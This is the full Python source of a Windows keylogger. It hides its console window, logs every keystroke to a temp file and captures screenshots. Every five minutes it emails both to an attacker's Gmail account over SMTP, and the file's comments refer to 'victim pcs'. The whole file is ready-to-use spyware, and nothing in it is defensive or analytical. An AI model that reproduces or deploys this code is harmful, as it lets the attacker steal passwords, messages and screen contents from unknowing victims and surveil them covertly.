import win32api
import win32console
import win32gui
import pythoncom
from pynput import keyboard
import threading
import smtplib
import ssl
import pyautogui
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from pytz import reference
import imghdr
import time
import os

# close the console window
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)


def on_press(key):
    pass


def on_release(key):
    root = os.path.expanduser('~')
    file_path = root + "\\AppData\\Local\\Temp\\output.txt"
    try:
        open(file_path, "a")
    except:
        pass

    try:
        # open output.txt to read current keystrokes
        f = open(file_path, 'r+')
        buffer = f.read()
        f.close()

        # open output.txt to write current + new keystrokes
        f = open(file_path, 'w')

        # EXTREMELY INELEGANT IF-ELIF STATEMENT FOLLOWS, AVERT YOUR EYES
        if key == keyboard.Key.enter:
            buffer = buffer + "\n"
        elif key == keyboard.Key.space:
            buffer = buffer + " "
        elif key == keyboard.Key.backspace:
            buffer = buffer + "[<-]"
        elif key == keyboard.Key.tab:
            buffer = buffer + "\t"
        elif key == keyboard.Key.caps_lock:
            buffer = buffer + "[CPS_LCK]"
        elif key == keyboard.Key.shift or key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            buffer = buffer + "[SHIFT]"
        elif key == keyboard.Key.alt or key == keyboard.Key.alt_gr or key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            buffer = buffer + "[ALT]"
        elif key == keyboard.Key.cmd or key == keyboard.Key.cmd_l or key == keyboard.Key.cmd_r:
            buffer = buffer + "[CMD]"
        elif key == keyboard.Key.ctrl or key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            buffer = buffer + "[CTRL]"
        elif key == keyboard.Key.delete:
            buffer = buffer + "[DEL]"
        elif key == keyboard.Key.down:
            buffer = buffer + "[DOWN]"
        elif key == keyboard.Key.end:
            buffer = buffer + "[END]"
        elif key == keyboard.Key.esc:
            buffer = buffer + "[ESC]"
        elif key == keyboard.Key.home:
            buffer = buffer + "[HOME]"
        elif key == keyboard.Key.insert:
            buffer = buffer + "[INSERT]"
        elif key == keyboard.Key.left:
            buffer = buffer + "[LEFT]"
        elif key == keyboard.Key.media_next or key == keyboard.Key.media_play_pause or key == keyboard.Key.media_previous or key == keyboard.Key.media_volume_down or key == keyboard.Key.media_volume_mute or key == keyboard.Key.media_volume_up:
            buffer = buffer + " {} ".format(str(key))
        elif key == keyboard.Key.menu:
            buffer = buffer + "[MENU]"
        elif key == keyboard.Key.num_lock:
            buffer = buffer + "[NUM_LCK]"
        elif key == keyboard.Key.page_down or key == keyboard.Key.page_up:
            buffer = buffer + " {} ".format(str(key))
        elif key == keyboard.Key.pause:
            buffer = buffer + "[PAUSE]"
        elif key == keyboard.Key.print_screen:
            buffer = buffer + "[PRT_SCRN]"
        elif key == keyboard.Key.right:
            buffer = buffer + "[RIGHT]"
        elif key == keyboard.Key.scroll_lock:
            buffer = buffer + "[SCRL_LCK]"
        elif key == keyboard.Key.up:
            buffer = buffer + "[UP]"
        else:
            # Clip the ' from the key string
            out = str(key)[1:-1]
            buffer = buffer + out

        # Write buffer to text file
        f.write(buffer)
        f.close()
    except:
        pass


def send():
    while True:

        # Get user directory to be able to access the temp directory where we will store the files
        root = os.path.expanduser('~')
        try:
            # Take a screenshot of the screen and save it in the temp directory
            ss_file_path = root + "\\AppData\\Local\\Temp\\ss.jpg"
            myScreenshot = pyautogui.screenshot()
            myScreenshot.save(r'{}'.format(ss_file_path))
        except:
            pass

        try:
            port = 465  # For SSL

            # Credentials for the gmail connection
            password = ""
            mail = ""

            # Create a secure SSL context
            context = ssl.create_default_context()

            # Connect to the gmail server
            with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
                server.login(mail, password)

                # Get datetime and computer name so we can discern incoming mails from multiple victim pcs
                now = datetime.now()
                localtime = reference.LocalTimezone()
                name = os.environ['COMPUTERNAME']
                dt_string = now.strftime(
                    "%a, %d/%m/%Y %H:%M:%S ") + localtime.tzname(now)
                nametime = "{} - {}".format(name, dt_string)

                # Create the MIMEMultipart object that we will send
                msg = MIMEMultipart()

                # Set the relevant fields of the object
                msg['From'] = mail
                msg['To'] = mail
                msg['Subject'] = nametime

                # the path that we will use to store our keylogger output
                txt_file_path = root + "\\AppData\\Local\\Temp\\output.txt"

                try:
                    # Attach the output file to the mail
                    txt_attachment = MIMEText(open(txt_file_path).read())
                    txt_attachment.add_header(
                        'Content-Disposition', 'attachment', filename='{}.txt'.format(nametime))
                    msg.attach(txt_attachment)

                    # Clear the output file so that mails dont include duplicates or get bigger over time
                    with open(txt_file_path, "w") as f:
                        f.write("")
                except:
                    pass

                try:
                    # Attach the screenshot to the mail
                    with open(ss_file_path, 'rb') as f:
                        img = MIMEImage(f.read())
                    img.add_header('Content-Disposition', 'attachment',
                                   filename='{}.jpg'.format(nametime))
                    msg.attach(img)
                except:
                    pass

                try:
                    # send the mail
                    server.sendmail(mail, mail, msg.as_string())
                except:
                    pass
        except:
            pass
        # Wait for min minutes
        min = 5
        time.sleep(min * 60)


# create a hook manager object

root = os.path.expanduser('~')
file_path = root + "\\AppData\\Local\\Temp\\output.txt"
try:
    open(file_path, "a")
except:
    pass
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
# start listener
listener.start()

# create the mail thread
mail = threading.Thread(target=send)
mail.start()

# wait forever
pythoncom.PumpMessages()
